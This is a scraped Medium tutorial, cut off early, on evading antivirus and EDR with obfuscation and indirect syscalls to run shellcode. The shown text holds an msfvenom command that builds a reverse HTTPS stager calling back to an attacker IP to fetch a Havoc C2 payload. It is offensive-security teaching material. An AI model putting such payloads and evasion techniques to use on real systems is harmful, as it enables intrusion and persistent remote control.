# https://medium.com/@sam.rothlisberger/manual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f

<!DOCTYPE html><html lang="en" data-rh="lang" dir="ltr"><body><div id="root"><div class="a b c"><a href="https://medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" rel="noopener follow" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="tu" role="dialog" aria-modal="true" tabindex="-1"><div class="yp yq bi ed yr ys yt aq yu hd yv" aria-hidden="true" role="presentation"></div><div class="yw yr yx yy yz yp ed fk za zb zc mb zd ze zf zg zh zi zj zk zl zm ac cv zn" aria-hidden="true"><div class="zo gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz zp hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="7ae3" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih bl" data-testid="storyTitle" data-selectable-paragraph="">Manual Indirect Syscalls and Obfuscation for Shellcode Execution</h1></div><div><h2 id="e596" class="pw-subtitle-paragraph ii hk hl bg b ij ik il im in io ip iq ir is it iu iv iw ix cx eb" data-selectable-paragraph="">DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any damage you may cause by using these tools and methods.</h2><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac iy iz ja jb jc jd je jf jg jh ji"><div class="ac r ji"><div class="ac jj"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--bb589148e56f---------------------------------------" data-discover="true"><div class="m jk jl by jm jn"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="jo by m bz ca fw o jp gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="jq ac r"><div class="ac r jr"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at js" data-testid="authorName" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--bb589148e56f---------------------------------------" data-discover="true">Sam Rothlisberger</a></span></div></div></div></div><div class="jt bn"></div><button class="wa abi aq ac ci r abj abk abl" style="border: 1px solid rgba(4, 4, 4, 0.1);"><span class="bg b bh ab bl bi"><span class="bn abm">Follow</span></span></button></div></div></span></div><div class="ac r ju"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">15 min read</span><div class="jv jw m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Mar 30, 2024</span></div></span></div></div><div class="ac cw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km"><div class="i l x fp fq r"><div class="lc m"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fbb589148e56f&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;user=Sam+Rothlisberger&amp;userId=f215b9cd90cb&amp;source=---header_actions--bb589148e56f---------------------clap_footer------------------" data-discover="true"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><div><div class="bn" aria-describedby="66" aria-labelledby="66" role="tooltip"><div tabindex="-1" class="bf"><p class="bg b ec ab eb"><button class="ah ai aj fo al am an ao ap aq ar as at au av abn mg">87<span class="m i h g tz ua"></span></button></p></div></div></div></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq lj mb mc ac r fs md me" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ma"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count lz ma">1</span></p></button></div></div></div></div><div class="ac r kn ko kp kq kr ks kt ku kv kw kx ky kz la lb"><div class="mf l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fbb589148e56f&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;source=---header_actions--bb589148e56f---------------------bookmark_footer------------------" data-discover="true"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb mg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk mh cu"><div class="m ag"><div class="ac ci"><div class="mi mj mk ml mm mn cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dbb589148e56f&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&amp;source=---header_actions--bb589148e56f---------------------post_audio_button------------------" data-discover="true"><div><div class="bn" aria-describedby="53" aria-labelledby="53" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><p id="51c5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">For this post, we’re going to cover a possible way to bypass signature analysis from AV using <strong class="ni hm">obfuscation</strong> and NT API inspection from EDR using <strong class="ni hm">indirect syscalls</strong> with a shellcode loader PE. This will get past some AV and EDR that <strong class="ni hm">only</strong> does on-disk inspection of the PE (signature based) and inspects the system call return address (not the full stack), respectively.</p><h2 id="cdad" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Generating Shellcode with Msfvenom</h2><p id="b40a" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">The Havoc C2 shellcode is pretty big, so we should use our msfvenom shellcode (stage 1 payload) to fetch the Havoc C2 shellcode as a stage 2 payload. I’m calling this shellcode msf.bin.</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="62b6" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph="">msfvenom -p windows/x64/<span class="hljs-keyword">custom</span>/reverse_https LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.64</span> LPORT=<span class="hljs-number">8443</span> EXITFUNC=thread -f raw HttpUserAgent=’Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">6.1</span>; WOW64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, <span class="hljs-built_in">like</span> Gecko) Chrome/<span class="hljs-number">96.0</span>.<span class="hljs-number">4664.110</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-comment">' LURI=blog.html HandlerSSLCert=/home/atler/Downloads/www.google.com.pem -o msf.bin</span></span></pre><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps pt"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JF6WgSyLzZAMn3eh7ArQBg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*JF6WgSyLzZAMn3eh7ArQBg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JF6WgSyLzZAMn3eh7ArQBg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JF6WgSyLzZAMn3eh7ArQBg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JF6WgSyLzZAMn3eh7ArQBg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*JF6WgSyLzZAMn3eh7ArQBg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JF6WgSyLzZAMn3eh7ArQBg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*JF6WgSyLzZAMn3eh7ArQBg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="109" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*JF6WgSyLzZAMn3eh7ArQBg.png"></picture></div></div></figure><p id="43b4" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Check out my previous post about making a HandlerSSLCert if you’re unsure.</p><h2 id="9829" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Generating Shellcode with Havoc C2</h2><p id="4393" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">Check out my previous post about setting up the listener and generating the shellcode payload. We will use almost all the same options for the payload except we won't be using indirect syscalls because we’ll use our loader PE for that instead. I’m calling this shellcode Havoc.bin.</p><div class="qa qb qc qd qe qf"><a rel="noopener follow" href="https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b?source=post_page-----bb589148e56f---------------------------------------" target="_blank" data-discover="true"><div class="qg ac cb"><div class="qh ac cv ci cd qi"><h2 class="bg hm qj ab ga qk ql qm qn qo qp hk bl">Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)</h2><div class="qq m"><p class="bg b ec ab ga qk ql qm qn qo qp eb">medium.com</p></div></div><div class="qr m"><div class="wv m qt qu qv qr qw mn qf"></div></div></div></a></div><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div class="pr ps qx"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ppIYR9VEuxfZ2dntO11f3A.png 750w, 